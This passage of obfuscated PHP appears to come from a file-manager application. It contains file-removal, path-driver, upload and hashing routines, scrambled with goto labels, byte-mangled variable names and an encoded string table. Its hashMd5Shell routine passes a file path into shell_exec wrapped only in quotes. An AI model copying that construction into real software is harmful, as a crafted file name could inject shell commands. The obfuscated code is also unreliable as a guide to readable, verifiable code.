$D⁄‘·âï∏é[$Fñï⁄£Ñı¿[6]] = json_decode($D⁄‘·âï∏é[$Fñï⁄£Ñı¿[6]], !0); return $D⁄‘·âï∏é; } public function remove($fÆΩﬁ‡òâÖ) { $this->removeShareItems($fÆΩﬁ‡òâÖ); return parent::remove($fÆΩﬁ‡òâÖ); } public function removeWithFile($CâéÎ≤§∫›) { goto f‘¡òÎÎ∑˜; cû˜À‘ëıÖ: $CîÎªåÒ˜µ = Model($d–’´Ïë¨‘[422])->where($d©§»©Òﬁ¥)->sum($d–’´Ïë¨‘[77]); $CÚÔùü‰∞∑ = $d–’´Ïë¨‘[2378] . $CâéÎ≤§∫›; $F‹ºÆΩˆ›û = new TaskFileTransfer($CÚÔùü‰∞∑, $d–’´Ïë¨‘[2379], $A„¢Á–ƒêã, LNG($d–’´Ïë¨‘[2380]) . "\50{$CâéÎ≤§∫›}\x29"); goto F˘‘‹ÿ€ò£; F˘‘‹ÿ€ò£: $F‹ºÆΩˆ›û->task[$d–’´Ïë¨‘[698]] = (double) $CîÎªåÒ˜µ; $CçÂ§ä—Œ‰ = KodIO::defaultDriver(); $Bˆõ´·ä∆Ü = $CçÂ§ä—Œ‰[$d–’´Ïë¨‘[367]]; goto A◊·øöºÓ‚; aÜÒ≤éßÏÔ: if (!$F”∞¥√≈ú¯) { $F‹ºÆΩˆ›û->stop($CÚÔùü‰∞∑); return !1; } $F‹ºÆΩˆ›û->end(); $this->remove($CâéÎ≤§∫›); goto F∆¶…¯êÚ√; A◊·øöºÓ‚: $B∏é·∑ÓŒì = "\x7b\151\157\x3a{$Bˆõ´·ä∆Ü}\x7d\x2f"; $F”∞¥√≈ú¯ = !0; $d·…ïûå¯À = array(); goto cèÆ¶Ñ¿Ñﬂ; cèÆ¶Ñ¿Ñﬂ: $Aô±éÿ›¥≥ = Model($d–’´Ïë¨‘[167])->where($d©§»©Òﬁ¥)->field($d–’´Ïë¨‘[2381])->select(); foreach ($Aô±éÿ›¥≥ as $Dñ÷π–Æ«¢) { goto e·„èÀç’•; e·„èÀç’•: $fÛóçÊÿˆä = $Dñ÷π–Æ«¢[$d–’´Ïë¨‘[75]]; $dÒößÁ∑‰ß = $B∏é·∑ÓŒì . str_replace("\173\x69\157\72{$CâéÎ≤§∫›}\175\57", $d–’´Ïë¨‘[33], $fÛóçÊÿˆä); if (!IO::exist($fÛóçÊÿˆä)) { $d·…ïûå¯À[] = $Dñ÷π–Æ«¢[$d–’´Ïë¨‘[419]]; $F‹ºÆΩˆ›û->updateFileEnd($Dñ÷π–Æ«¢[$d–’´Ïë¨‘[28]], $Dñ÷π–Æ«¢[$d–’´Ïë¨‘[77]]); continue; } goto aÓ‘ÑÙÉª…; f∫≥∑âÉÑ®: $bèù§Üë¬‘ = array($d–’´Ïë¨‘[752] => $Bˆõ´·ä∆Ü, $d–’´Ïë¨‘[75] => $dÒößÁ∑‰ß); Model($d–’´Ïë¨‘[167])->where($d©§»©Òﬁ¥)->save($bèù§Üë¬‘); goto aå¢´Ó∑≥ò; aÓ‘ÑÙÉª…: if (IO::exist($dÒößÁ∑‰ß)) { $F‹ºÆΩˆ›û->updateFileEnd($Dñ÷π–Æ«¢[$d–’´Ïë¨‘[28]], $Dñ÷π–Æ«¢[$d–’´Ïë¨‘[77]]); continue; } if (!IO::move($fÛóçÊÿˆä, get_path_father($dÒößÁ∑‰ß))) { $F”∞¥√≈ú¯ = !1; break; } $d©§»©Òﬁ¥ = array($d–’´Ïë¨‘[419] => $Dñ÷π–Æ«¢[$d–’´Ïë¨‘[419]]); goto f∫≥∑âÉÑ®; aå¢´Ó∑≥ò: } $this->removeByFileID($d·…ïûå¯À); goto aÜÒ≤éßÏÔ; f‘¡òÎÎ∑˜: $d–’´Ïë¨‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d©§»©Òﬁ¥ = array($d–’´Ïë¨‘[752] => $CâéÎ≤§∫›); $A„¢Á–ƒêã = Model($d–’´Ïë¨‘[422])->where($d©§»©Òﬁ¥)->count(); goto cû˜À‘ëıÖ; F∆¶…¯êÚ√: } public function progress($C€ò«Ñß‹ê) { return Task::get($_SERVER[Ä¿¡‡öóµŸﬂ‡][2378] . $C€ò«Ñß‹ê); } private function removeByFileID($Añÿ£úÇ§Â = array()) { goto dÍ„ƒ¬ÙÜÔ; Fÿáàâ∑¶ã: foreach ($déıΩ„Ó∏Œ as $Aû«ıö“ÑÂ) { Model($A§‹–±£ıÁ[382])->removeNow($Aû«ıö“ÑÂ, !1); } goto d£ºˆˆ”≈Î; dÚàü√Ëíﬂ: $déıΩ„Ó∏Œ = Model($A§‹–±£ıÁ[1121])->where($cä”Ñé‰ØÑ)->field($A§‹–±£ıÁ[369])->select(); if (!$déıΩ„Ó∏Œ) { return; } $déıΩ„Ó∏Œ = array_to_keyvalue($déıΩ„Ó∏Œ, $A§‹–±£ıÁ[33], $A§‹–±£ıÁ[369]); goto Fÿáàâ∑¶ã; dÍ„ƒ¬ÙÜÔ: $A§‹–±£ıÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($Añÿ£úÇ§Â)) { return; } $cä”Ñé‰ØÑ = array($A§‹–±£ıÁ[419] => array($A§‹–±£ıÁ[7], $Añÿ£úÇ§Â)); goto dÚàü√Ëíﬂ; d£ºˆˆ”≈Î: } private function removeShareItems($dÃú‰óπ™÷) { goto BÖ¿âŒÛ‚ë; BÖ¿âŒÛ‚ë: $eßå”⁄›Ÿ∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B›¡¡í›•º = "\173\151\157\72{$dÃú‰óπ™÷}\175\57"; $FÎÓØ√¡∆± = array($eßå”⁄›Ÿ∫[369] => 0, $eßå”⁄›Ÿ∫[1023] => array($eßå”⁄›Ÿ∫[760], "{$B›¡¡í›•º}\x25")); goto B∞á¢∆∂Ö«; f”Ö¯÷ÃÓ‚: Model($eßå”⁄›Ÿ∫[536])->remove($eîÜçÿ¥Üé); goto b´µ’è˜óÏ; B∞á¢∆∂Ö«: $Bìì‡Ÿ¢ñΩ = Model($eßå”⁄›Ÿ∫[2083])->where($FÎÓØ√¡∆±)->field($eßå”⁄›Ÿ∫[441])->select(); if (empty($Bìì‡Ÿ¢ñΩ)) { return; } $eîÜçÿ¥Üé = array_to_keyvalue($Bìì‡Ÿ¢ñΩ, $eßå”⁄›Ÿ∫[33], $eßå”⁄›Ÿ∫[441]); goto f”Ö¯÷ÃÓ‚; b´µ’è˜óÏ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x4c\151\147\x68\x74\101\160\x70"; public $modelType = "\123\171\163\x74\x65\x6d\117\160\164\151\157\156"; public $field = array("\x6e\x61\x6d\x65", "\x67\x72\x6f\x75\160", "\x64\x65\x73\x63", "\143\x6f\156\164\145\156\x74"); public function listData($BƒÎŸ¡º€√ = false, $bÂı€¨ÁÀŸ = "\x6d\157\x64\151\146\x79\x54\151\x6d\x65", $cËéÒîßàÈ = true) { return parent::listData($BƒÎŸ¡º€√, $bÂı€¨ÁÀŸ, $cËéÒîßàÈ); } public function remove($bâΩ‹ÕÑäâ) { $f†´Í≤‰´ù = $this->findByName($bâΩ‹ÕÑäâ); if (!$f†´Í≤‰´ù) { return !1; } return parent::remove($f†´Í≤‰´ù[$_SERVER[Ä¿¡‡öóµŸﬂ‡][367]]); } public function add($F–∏πÔ≥´•) { if ($this->findByName($F–∏πÔ≥´•[$_SERVER[Ä¿¡‡öóµŸﬂ‡][28]])) { return !1; } return parent::insert($F–∏πÔ≥´•); } public function update($fõúƒö…Ë, $FôÊƒÒΩ„≠) { $FæßÜ◊îµ¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B¢⁄Òå‹äí = $this->findByName($fõúƒö…Ë); $E∑÷¬Ñé•Õ = $this->findByName($FôÊƒÒΩ„≠[$FæßÜ◊îµ¥[28]]); if (!$B¢⁄Òå‹äí || $E∑÷¬Ñé•Õ && $E∑÷¬Ñé•Õ[$FæßÜ◊îµ¥[367]] != $B¢⁄Òå‹äí[$FæßÜ◊îµ¥[367]]) { return !1; } return parent::update($B¢⁄Òå‹äí[$FæßÜ◊îµ¥[367]], $FôÊƒÒΩ„≠); } } goto fáÔÈÃÚÈ±; FÂ•â‡ôÆ¶: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $b¡«è≥∏Û• =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->objectDriver = array($b¡«è≥∏Û•[57], $b¡«è≥∏Û•[58], $b¡«è≥∏Û•[59], $b¡«è≥∏Û•[60], $b¡«è≥∏Û•[61], $b¡«è≥∏Û•[62], $b¡«è≥∏Û•[63], $b¡«è≥∏Û•[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($E™ô®·µÃÃ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($E™ô®·µÃÃ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][8]); } return $E™ô®·µÃÃ; } public function getPathName($BÖ⁄ôÑåÙπ) { return $BÖ⁄ôÑåÙπ; } public function iconvApp($C…ôñ∑ŸÜ‹) { return $C…ôñ∑ŸÜ‹; } public function iconvSystem($E∫éÇﬂçˆÍ) { return $E∫éÇﬂçˆÍ; } public function iconvTo($A«Úõﬁçµø, $EëÎÑ•üÆÁ, $AˆÖ¡…ø⁄·) { goto bªâ¨±èæç; A·ÎÀ⁄æÛÇ: $F¡Ê´„“ÒŸ = $EëÎÑ•üÆÁ . $Fáÿó∫ñé÷[66] . $AˆÖ¡…ø⁄· . $Fáÿó∫ñé÷[67] . $A«Úõﬁçµø; if (isset($f•€ﬂ∑û⁄ä[$F¡Ê´„“ÒŸ])) { return $f•€ﬂ∑û⁄ä[$F¡Ê´„“ÒŸ]; } if (function_exists($Fáÿó∫ñé÷[68])) { $D˘Í˜èπ∫é = @mb_convert_encoding($A«Úõﬁçµø, $AˆÖ¡…ø⁄·, $EëÎÑ•üÆÁ); } else { $D˘Í˜èπ∫é = @iconv($EëÎÑ•üÆÁ, $AˆÖ¡…ø⁄·, $A«Úõﬁçµø); } goto cû©Ú√ ±õ; b»ÜÇ«ç’ÿ: return $D˘Í˜èπ∫é; goto D“°ƒË”Ö…; bªâ¨±èæç: $Fáÿó∫ñé÷ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$A«Úõﬁçµø || !function_exists($Fáÿó∫ñé÷[65])) { return $A«Úõﬁçµø; } static $f•€ﬂ∑û⁄ä = array(); goto A·ÎÀ⁄æÛÇ; cû©Ú√ ±õ: $D˘Í˜èπ∫é = $D˘Í˜èπ∫é ? $D˘Í˜èπ∫é : $A«Úõﬁçµø; if (strstr($D˘Í˜èπ∫é, $Fáÿó∫ñé÷[69])) { $D˘Í˜èπ∫é = str_replace($Fáÿó∫ñé÷[69], $Fáÿó∫ñé÷[70], $D˘Í˜èπ∫é); } $f•€ﬂ∑û⁄ä[$EëÎÑ•üÆÁ . $Fáÿó∫ñé÷[66] . $AˆÖ¡…ø⁄· . $Fáÿó∫ñé÷[67] . $A«Úõﬁçµø] = $D˘Í˜èπ∫é; goto f±ÖØπ‘÷™; f±ÖØπ‘÷™: $f•€ﬂ∑û⁄ä[$AˆÖ¡…ø⁄· . $Fáÿó∫ñé÷[66] . $EëÎÑ•üÆÁ . $Fáÿó∫ñé÷[67] . $A«Úõﬁçµø] = $A«Úõﬁçµø; $f•€ﬂ∑û⁄ä[$AˆÖ¡…ø⁄· . $Fáÿó∫ñé÷[66] . $EëÎÑ•üÆÁ . $Fáÿó∫ñé÷[67] . $D˘Í˜èπ∫é] = $A«Úõﬁçµø; $f•€ﬂ∑û⁄ä[$EëÎÑ•üÆÁ . $Fáÿó∫ñé÷[66] . $AˆÖ¡…ø⁄· . $Fáÿó∫ñé÷[67] . $D˘Í˜èπ∫é] = $D˘Í˜èπ∫é; goto b»ÜÇ«ç’ÿ; D“°ƒË”Ö…: } public function getPathInner($c´§ »ãì¿) { $b‰´ƒ≠êÒú = IO::init($c´§ »ãì¿); return $b‰´ƒ≠êÒú->path; } public function getPathOuter($dÂ°ëúß†ô) { $C‰Ö‘•Â„õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d÷ØÑîŸæ‰ = strlen(trim($this->pathBase, $C‰Ö‘•Â„õ[8])); $dÂ°ëúß†ô = substr(trim($dÂ°ëúß†ô, $C‰Ö‘•Â„õ[8]), $d÷ØÑîŸæ‰); return $this->pathDriver . $C‰Ö‘•Â„õ[8] . ltrim($dÂ°ëúß†ô, $C‰Ö‘•Â„õ[8]); } public function isParentOf($FıÆ∏∏ÖÒÜ, $Bœ”‚Úı∆˜) { $bä¬ÍÂê„ê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FıÆ∏∏ÖÒÜ = rtrim(strtolower($FıÆ∏∏ÖÒÜ), $bä¬ÍÂê„ê[8]) . $bä¬ÍÂê„ê[8]; $Bœ”‚Úı∆˜ = rtrim(strtolower($Bœ”‚Úı∆˜), $bä¬ÍÂê„ê[8]) . $bä¬ÍÂê„ê[8]; $E≠ﬁ˘ø¥€ = strpos($Bœ”‚Úı∆˜, $FıÆ∏∏ÖÒÜ) === 0; return $E≠ﬁ˘ø¥€; } public function getType() { $bÙÀ•≤®º• =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÈà’»¿°∏ = str_replace($bÙÀ•≤®º•[71], $bÙÀ•≤®º•[33], get_class($this)); return strtolower($dÈà’»¿°∏); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($A»à±ﬂ·¡≥, $C◊ª†„òø) { $aÇ´∏“œ‹— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D¨é ©õ¨∆ = rtrim($A»à±ﬂ·¡≥, $aÇ´∏“œ‹—[8]) . $aÇ´∏“œ‹—[8] . $C◊ª†„òø; $CãﬂóŸœß£ = $this->exist($D¨é ©õ¨∆); return $CãﬂóŸœß£ ? $D¨é ©õ¨∆ : !1; } public function renameObject($AÜ÷”ÁºÙó, $eç≤ê∆ç⁄Î) { goto c≈®¡ç⁄Õ†; F»éÓ„‹√€: $AÜ÷”ÁºÙó = $this->getPathOuter($AÜ÷”ÁºÙó); $eç≤ê∆ç⁄Î = $this->pathFather($AÜ÷”ÁºÙó) . $eç≤ê∆ç⁄Î; if (IO::isFile($AÜ÷”ÁºÙó)) { $bÎÖÜÖÀáî = IO::copy($AÜ÷”ÁºÙó, $this->pathFather($AÜ÷”ÁºÙó), REPEAT_RENAME_FOLDER, $B¡âãïΩ◊); if ($bÎÖÜÖÀáî) { IO::remove($AÜ÷”ÁºÙó); } } else { $bÎÖÜÖÀáî = IO::mkdir($eç≤ê∆ç⁄Î); if (!$bÎÖÜÖÀáî) { return !1; } $Aï“è√Éµ” = IO::listPath($AÜ÷”ÁºÙó, !0); $Bøó—⁄ﬂ¯ã = array_merge($Aï“è√Éµ”[$D£‚êõÈéç[73]], $Aï“è√Éµ”[$D£‚êõÈéç[74]]); foreach ($Bøó—⁄ﬂ¯ã as $Båõ≈ÔÃåä) { IO::move($Båõ≈ÔÃåä[$D£‚êõÈéç[75]], $eç≤ê∆ç⁄Î, REPEAT_RENAME_FOLDER); } IO::remove($AÜ÷”ÁºÙó); } goto b√íòìŒÑÖ; c≈®¡ç⁄Õ†: $D£‚êõÈéç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B¡âãïΩ◊ = $eç≤ê∆ç⁄Î; Hook::trigger($D£‚êõÈéç[72], $this, $AÜ÷”ÁºÙó, $this, $this->pathFather($AÜ÷”ÁºÙó) . $eç≤ê∆ç⁄Î); goto F»éÓ„‹√€; b√íòìŒÑÖ: return $bÎÖÜÖÀáî ? $eç≤ê∆ç⁄Î : !1; goto EáÖ•Ö´ú±; EáÖ•Ö´ú±: } public function tempFile($cÿ¯áø…ƒä = '', $eÏŒ«ãÃä… = '') { goto C≥±ìè≥“÷; eïÏúíì–€: $FÃ¢∫ŸÃ¢ê = $DÉîÕÁÏìÚ . $cÿ¯áø…ƒä; @touch($FÃ¢∫ŸÃ¢ê); if ($eÏŒ«ãÃä…) { file_put_contents($FÃ¢∫ŸÃ¢ê, $eÏŒ«ãÃä…); } goto EŸº€®ô‘‚; C≥±ìè≥“÷: if (!$cÿ¯áø…ƒä) { $cÿ¯áø…ƒä = rand_string(15); } $DÉîÕÁÏìÚ = TEMP_FILES . rand_string(15) . $_SERVER[Ä¿¡‡öóµŸﬂ‡][8]; @mkdir($DÉîÕÁÏìÚ, 511, !0); goto eïÏúíì–€; EŸº€®ô‘‚: return $FÃ¢∫ŸÃ¢ê; goto Bì°àÚí––; Bì°àÚí––: } public function tempFileRemve($EÜâıè√Œ§) { @unlink($EÜâıè√Œ§); @rmdir($this->pathFather($EÜâıè√Œ§)); } public function mkfile($bÛÓµîèÿÀ, $DÊÌƒ¨åÜ® = '', $Aﬂíèó†ë = REPEAT_RENAME) { } public function mkdir($EçÚÕÒïë‰, $aﬂâ‚‹çú = REPEAT_SKIP) { } public function delFile($aÙ‘„ö¿‰ˆ) { } public function delFolder($a…öâõ¶•Ô) { } public function copyFile($aœÌ£ˆÜü´, $fŸéÏ÷´Ú») { } public function moveFile($e·‘ÇÉˆäñ, $f©±–‰ô´ì) { } public function remove($AïøœöŒ…√) { if ($this->isFile($AïøœöŒ…√)) { return $this->delFile($AïøœöŒ…√); } return $this->delFolder($AïøœöŒ…√); } public function rename($F‹Ø≤™Úµ, $EïˆÉûàïæ) { } public function exist($BŸ‚ıÀ÷©Ë) { } public function findByHash($FÇûîÃÊ¬ß = '', $bí∆È÷Âí§ = '') { return !1; } public function isFile($f⁄Ì˘≠∞ä‚) { } public function isFolder($CÙΩâµìÑÚ) { } public function size($e˜˘¬ç¨òÍ) { } public function info($f◊≠Ωà†«Â) { } public function infoSimple($D⁄¨ù«ü¨≥) { return $this->info($D⁄¨ù«ü¨≥); } public function infoAuth($d∞≠ öù∫π) { return $this->info($d∞≠ öù∫π); } public function infoFull($D›‰ôúëÃå) { return $this->info($D›‰ôúëÃå); } public function infoWithChildren($Eß¢≈ôΩáπ) { $EΩΩúçâ≥Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $A¬âù°›ö· = array(); if (isset($A¬âù°›ö·[$Eß¢≈ôΩáπ])) { return $A¬âù°›ö·[$Eß¢≈ôΩáπ]; } $F¡•ŸêÚÑ = $this->info($Eß¢≈ôΩáπ); if ($F¡•ŸêÚÑ && $F¡•ŸêÚÑ[$EΩΩúçâ≥Ÿ[29]] == $EΩΩúçâ≥Ÿ[76]) { $Aó≈—Ø‡˜å = array($EΩΩúçâ≥Ÿ[77] => 0, $EΩΩúçâ≥Ÿ[78] => 0, $EΩΩúçâ≥Ÿ[79] => 0); $this->infoChildren($Eß¢≈ôΩáπ, $Aó≈—Ø‡˜å); $F¡•ŸêÚÑ[$EΩΩúçâ≥Ÿ[77]] = $Aó≈—Ø‡˜å[$EΩΩúçâ≥Ÿ[77]]; $F¡•ŸêÚÑ[$EΩΩúçâ≥Ÿ[80]] = array($EΩΩúçâ≥Ÿ[81] => $Aó≈—Ø‡˜å[$EΩΩúçâ≥Ÿ[78]], $EΩΩúçâ≥Ÿ[82] => $Aó≈—Ø‡˜å[$EΩΩúçâ≥Ÿ[79]]); $A¬âù°›ö·[$Eß¢≈ôΩáπ] = $F¡•ŸêÚÑ; } return $F¡•ŸêÚÑ; } public function listPath($eÀàøÇâı—, $D¥∏Êÿ◊“Ò = false) { } public function has($Cúàåàáæÿ, $cÜá⁄œª∫ó = false, $F≤∂≥Œ–âÿ = false) { } public function canRead($eàäœøó‰•) { } public function canWrite($f·ä∞·íÓí) { } public function getContent($FﬁŸ˘êñÊÒ) { } public function setContent($eÂ∏ˆ˘‘Çã, $BèªÁéÁë§ = '') { } protected function infoChildren($eñ‡øäÍ≠Ô, &$Fƒ©ÿ·Öø≤) { $e≈®ã®¯Œò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; check_abort(); $dÌ≠ª¥é∂∞ = $this->listPath($eñ‡øäÍ≠Ô, !0); $dÌ≠ª¥é∂∞ = array_merge($dÌ≠ª¥é∂∞[$e≈®ã®¯Œò[74]], $dÌ≠ª¥é∂∞[$e≈®ã®¯Œò[73]]); foreach ($dÌ≠ª¥é∂∞ as $fú£ÁÍ≠ç≈) { if ($fú£ÁÍ≠ç≈[$e≈®ã®¯Œò[29]] == $e≈®ã®¯Œò[76]) { $Fƒ©ÿ·Öø≤[$e≈®ã®¯Œò[79]]++; $b„ÔÑÈãó∑ = $this->getPathInner($fú£ÁÍ≠ç≈[$e≈®ã®¯Œò[75]]); $this->infoChildren($b„ÔÑÈãó∑, $Fƒ©ÿ·Öø≤); } else { $Fƒ©ÿ·Öø≤[$e≈®ã®¯Œò[78]]++; $Fƒ©ÿ·Öø≤[$e≈®ã®¯Œò[77]] += $fú£ÁÍ≠ç≈[$e≈®ã®¯Œò[77]]; } } } public function fileSubstr($eãèÆ‚¨Üœ, $e≤«‡âıÚ›, $C¿…Î«√©) { } public function listAll($D⁄‘ô›ı¿µ) { } public function upload($E∞áı“¿Éö, $DµÛ¨¯∆∑ä, $BêÕå™àû‰ = false, $b‹¨ë∞™€¥ = REPEAT_REPLACE) { } public function uploadFileByID($Fè•ˆÇﬂ∑Ü, $Dƒ£¯·ù±Ω, $eî≤ÙÇöÖª) { } public function uploadFileByPath($BÏ∏á≥ı∏ì, $dŒÏø∂ËêÖ, $BãØŒÏ∑ﬁ› = array()) { } public function isUploadServer() { $D†ãë«“≈© =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $D†ãë«“≈©[83]) { return !0; } return $GLOBALS[$D†ãë«“≈©[6]][$D†ãë«“≈©[84]][$D†ãë«“≈©[85]]; } public function isFileOutServer() { $b≈ùÃ√Œèä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $b≈ùÃ√Œèä[83]) { return !0; } return $GLOBALS[$b≈ùÃ√Œèä[6]][$b≈ùÃ√Œèä[84]][$b≈ùÃ√Œèä[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($c°ÏëéøÈ) { $F‹û‹„§µ¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->isCdnHost()) { return $c°ÏëéøÈ; } return str_replace(trim(get_url_root($c°ÏëéøÈ), $F‹û‹„§µ¥[8]), trim($this->cdnHost, $F‹û‹„§µ¥[8]), $c°ÏëéøÈ); } public function uploadLink($bëﬂ√Áîà·, $b∏Üà†®ùâ = 0) { goto B‡µÓîÃè–; bıÙòÛÛÎ≥: $Dúñﬁä≈ΩÔ = $b∏Üà†®ùâ <= $Eò⁄©é÷ÿÒ ? $Böπ∞◊ô“»[87] : $Böπ∞◊ô“»[88]; $E£“ÎÖ‰©õ = (!$b∏Üà†®ùâ ? 1 : ceil($b∏Üà†®ùâ / pow(1024, 3))) * 3600 * 4; $eê“â»£„ = $this->{$Dúñﬁä≈ΩÔ}($bëﬂ√Áîà·, $E£“ÎÖ‰©õ); goto Cõ–≈•Ê˜Ò; bª≥€ı®¯ﬁ: if (!in_array($CäÔà≤≥ëµ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Eò⁄©é÷ÿÒ = 1024 * 1024 * 10; goto bıÙòÛÛÎ≥; Cõ–≈•Ê˜Ò: if ($eê“â»£„) { $eê“â»£„[$Böπ∞◊ô“»[89]] = $bëﬂ√Áîà·; $eê“â»£„[$Böπ∞◊ô“»[90]] = $CäÔà≤≥ëµ; } return $eê“â»£„; goto F∫èÿπÉâ; B‡µÓîÃè–: $Böπ∞◊ô“» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->isUploadServer()) { return; } $CäÔà≤≥ëµ = $this->getType(); goto bª≥€ı®¯ﬁ; F∫èÿπÉâ: } public function uploadFormData($dîãœ™◊∆â, $F—å‘∏ËÑë = 3600) { } public function multiUploadFormData($c¿Ò∂√êÙ‘, $DﬂÆï∂åö∑ = 3600) { } public function download($eÃ€ã§≥õÎ, $fË®Ω¥ˆ”™) { } public function ext($c•ŒÈπüß©) { $c≥ç¶ØÇ°õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (strpos($c•ŒÈπüß©, $c≥ç¶ØÇ°õ[8]) === -1) { $fΩøæïÿÈÙ = $c•ŒÈπüß©; } else { $fΩøæïÿÈÙ = $this->pathThis($c•ŒÈπüß©); } $BêãªÊß›Ò = $c≥ç¶ØÇ°õ[33]; if (strstr($fΩøæïÿÈÙ, $c≥ç¶ØÇ°õ[91])) { $BêãªÊß›Ò = substr($fΩøæïÿÈÙ, strrpos($fΩøæïÿÈÙ, $c≥ç¶ØÇ°õ[91]) + 1); $BêãªÊß›Ò = strtolower($BêãªÊß›Ò); } if (strlen($BêãªÊß›Ò) > 3 && preg_match($c≥ç¶ØÇ°õ[92], $BêãªÊß›Ò, $Eô“ˆÏ‡Œ⁄)) { $BêãªÊß›Ò = $c≥ç¶ØÇ°õ[33]; } return $BêãªÊß›Ò; } public function pathThis($Cï÷≤∑¯–∫) { $F¶Ùøàñ¡ı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cï÷≤∑¯–∫ = str_replace($F¶Ùøàñ¡ı[93], $F¶Ùøàñ¡ı[8], rtrim($Cï÷≤∑¯–∫, $F¶Ùøàñ¡ı[8])); $f∏ÕüÿçöÂ = strrpos($Cï÷≤∑¯–∫, $F¶Ùøàñ¡ı[8]); if ($f∏ÕüÿçöÂ === !1) { return $Cï÷≤∑¯–∫; } return substr($Cï÷≤∑¯–∫, $f∏ÕüÿçöÂ + 1); } public function pathFather($b≠çìƒ„œ‚) { $A¿Ô„úÁªË =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b≠çìƒ„œ‚ = str_replace($A¿Ô„úÁªË[93], $A¿Ô„úÁªË[8], rtrim($b≠çìƒ„œ‚, $A¿Ô„úÁªË[8])); $DÇÜÆÿÜº = strrpos($b≠çìƒ„œ‚, $A¿Ô„úÁªË[8]); if ($DÇÜÆÿÜº === !1) { return $A¿Ô„úÁªË[33]; } return substr($b≠çìƒ„œ‚, 0, $DÇÜÆÿÜº + 1); } public function hashSimple($E∂õ∫ºãºÀ) { goto aÖÖ¨˘ç√Â; eØ¡Ö°∫⁄ﬁ: $c£ØîàºàÔ .= $this->fileSubstr($E∂õ∫ºãºÀ, $Bπùêü¨Ùº - $dàõìπ£≥Ì, $dàõìπ£≥Ì); return md5($c£ØîàºàÔ) . $Bπùêü¨Ùº; goto C†€πŸ±¢Ö; cÇ¬´ãÆÊª: $dàõìπ£≥Ì = 200; $a√Çâ»á±ˆ = 50; if ($Bπùêü¨Ùº <= $dàõìπ£≥Ì * $a√Çâ»á±ˆ) { return $this->hashMd5($E∂õ∫ºãºÀ) . $Bπùêü¨Ùº; } goto f“‚ÀÉÏå; aÖÖ¨˘ç√Â: $BÍ√ˆçÑúã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$E∂õ∫ºãºÀ) { return md5($BÍ√ˆçÑúã[33]); } $Bπùêü¨Ùº = $this->size($E∂õ∫ºãºÀ); goto cÇ¬´ãÆÊª; f“‚ÀÉÏå: $bÙΩÜüûÔ‰ = intval($Bπùêü¨Ùº / $a√Çâ»á±ˆ); $c£ØîàºàÔ = $BÍ√ˆçÑúã[33]; for ($d †Ãïùà± = 0; $d †Ãïùà± < $a√Çâ»á±ˆ; $d †Ãïùà±++) { $c£ØîàºàÔ .= $this->fileSubstr($E∂õ∫ºãºÀ, $bÙΩÜüûÔ‰ * $d †Ãïùà±, $dàõìπ£≥Ì); } goto eØ¡Ö°∫⁄ﬁ; C†€πŸ±¢Ö: } public static $md5Cache = array(); public function hashMd5($EëöëÆì…ˆ) { $EëöëÆì…ˆ = $this->iconvSystem($EëöëÆì…ˆ); if (isset(self::$md5Cache[$EëöëÆì…ˆ])) { return self::$md5Cache[$EëöëÆì…ˆ]; } self::$md5Cache[$EëöëÆì…ˆ] = $this->hashMd5Shell($EëöëÆì…ˆ); if (!self::$md5Cache[$EëöëÆì…ˆ]) { self::$md5Cache[$EëöëÆì…ˆ] = @md5_file($EëöëÆì…ˆ); } return self::$md5Cache[$EëöëÆì…ˆ]; } private function hashMd5Shell($AÎƒ¢‚∑Ó∆) { goto CìÕÆ·Ûò®; CìÕÆ·Ûò®: $B®ıÛç®Ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!function_exists($B®ıÛç®Ç[94])) { return !1; } $F» ÖÁ»≠ø = array($B®ıÛç®Ç[95], $B®ıÛç®Ç[96]); goto AﬂŒ†¨•Ωä; Céæ¢œà“Î: $C‚∫ÈıπÖÑ = shell_exec($Eø€íÖ’ÖÉ . "\x20\x22{$AÎƒ¢‚∑Ó∆}\x22"); $C‚∫ÈıπÖÑ = str_replace($B®ıÛç®Ç[100], $B®ıÛç®Ç[33], $C‚∫ÈıπÖÑ); return substr($C‚∫ÈıπÖÑ, 0, 32); goto DÏ≠•Ç„ÛÏ; AﬂŒ†¨•Ωä: $Eø€íÖ’ÖÉ = Cache::get($B®ıÛç®Ç[97]); if (!$Eø€íÖ’ÖÉ) { $B¨â€’»Ùÿ = BASIC_PATH . $B®ıÛç®Ç[98]; $B∏âÚØ∞•Ç = md5_file($B¨â€’»Ùÿ); $Eø€íÖ’ÖÉ = $B®ıÛç®Ç[99]; foreach ($F» ÖÁ»≠ø as 